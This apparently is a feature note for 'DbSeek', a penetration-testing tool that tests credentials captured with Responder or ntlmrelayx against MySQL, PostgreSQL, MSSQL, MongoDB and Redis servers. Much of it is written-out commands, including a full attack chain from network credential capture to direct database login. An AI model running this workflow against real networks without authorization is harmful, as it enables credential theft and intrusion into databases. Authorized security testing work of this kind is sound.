# DbSeek Custom Credentials Update

## New Feature: Test Credentials from Responder

DbSeek now supports testing custom username/password combinations that you might capture from tools like Responder, ntlmrelayx, or other credential harvesting tools.

---

## Usage

### Test Custom Credentials Only
```bash
# Test a single username:password combo captured from Responder
./dbseek.py -u admin -p Password123

# Test captured domain credentials
./dbseek.py -u CORP\\administrator -p SuperSecret123!

# Test captured service account
./dbseek.py -u svc_mssql -p ServicePass2024
```

### Test Both Custom and Default Credentials
```bash
# Test custom creds first, then try defaults if custom fails
./dbseek.py -t -u admin -p CapturedPass123

# With verbose output
./dbseek.py -t -u admin -p CapturedPass123 -v
```

### Real-World Example with Responder
```bash
# 1. Run Responder to capture credentials
sudo responder -I eth0 -wrf

# 2. When you capture credentials like:
#    [+] NTLMv2-SSP Hash: CORP\svc_backup::domain:hash...
#    Username: svc_backup
#    Password: BackupPass2024!

# 3. Test those credentials against all databases
./dbseek.py -u svc_backup -p 'BackupPass2024!'

# 4. Or test with both custom and defaults
./dbseek.py -t -u svc_backup -p 'BackupPass2024!'
```

---

## How It Works

The tool will:

1. **Test custom credentials FIRST** if provided via `-u` and `-p`
2. **Mark as "custom" source** in output for easy identification
3. **Then test default credentials** if `-t` flag is also used
4. **Show clear success messages** when custom credentials work

### Supported Databases

Custom credentials are tested on:
- **MySQL/MariaDB** (port 3306)
- **PostgreSQL** (port 5432)
- **MSSQL** (port 1433)
- **MongoDB** (port 27017)
- **Redis** (port 6379) - password only

---

## Output Examples

### When Custom Credentials Work

```bash
$ ./dbseek.py -u admin -p SecretPass123

[+] 192.168.1.100 - MySQL/MariaDB
    ⚠ MySQL custom credentials work: admin/SecretPass123
    ✓ MySQL: admin:SecretPass123

[+] 192.168.1.101 - MSSQL
    ⚠ MSSQL custom credentials work: admin/SecretPass123
    ✓ MSSQL: admin:SecretPass123

[+] Credentials saved to: db_creds.txt
```

### Credentials File Output

The `db_creds.txt` file will show the source:

```
# Database Credentials Found
# Format: IP | Service | Username | Password

192.168.1.100 | MySQL | admin | SecretPass123
192.168.1.101 | MSSQL | admin | SecretPass123
192.168.1.102 | PostgreSQL | admin | SecretPass123
```

### JSON Output

When using `--json`, custom credentials are marked:

```json
{
  "default_creds": [
    {
      "service": "MySQL",
      "username": "admin",
      "password": "SecretPass123",
      "source": "custom"
    }
  ]
}
```

---

## Integration with Attack Chain

### Complete Workflow

```bash
# 1. Start Responder (capture credentials)
sudo responder -I eth0 -wrf

# 2. Capture credentials from network traffic
#    [+] Captured: CORP\dbadmin:DatabasePass2024!

# 3. Scan network for databases
../dcseek/dcseek.py iplist.txt

# 4. Test captured credentials on all databases
./dbseek.py -u dbadmin -p 'DatabasePass2024!'

# 5. If credentials work, connect directly
mysql -h 192.168.1.100 -u dbadmin -p'DatabasePass2024!'
psql -h 192.168.1.101 -U dbadmin
```

### With ntlmrelayx

```bash
# 1. Capture credentials with ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support

# 2. When you see successful relay:
#    [+] CORP\svc_sql:SQLServicePass123

# 3. Test on databases
./dbseek.py -u svc_sql -p 'SQLServicePass123'
```

---

## Tips

✅ **Quote passwords with special characters**
```bash
./dbseek.py -u admin -p 'P@ssw0rd!2024'
```

✅ **Test domain credentials**
```bash
./dbseek.py -u 'CORP\administrator' -p 'DomainPass123'
```

✅ **Combine with default testing**
```bash
# Try custom first, then defaults
./dbseek.py -t -u captured_user -p captured_pass
```

✅ **Use with specific target file**
```bash
# Test only database servers
./dbseek.py -f database_servers.txt -u admin -p CapturedPass
```

---

## Notes

- Both `-u` (username) and `-p` (password) must be provided together
- Custom credentials are tried BEFORE default credentials
- If custom credentials fail and `-t` is specified, default credentials are still tested
- Redis only uses password (no username), so only `-p` is used for Redis
- Successful custom credentials are marked with "custom" source in output

---

**Updated:** October 2025  
**Feature:** Custom credential testing from Responder/ntlmrelayx  
**Status:** Production Ready
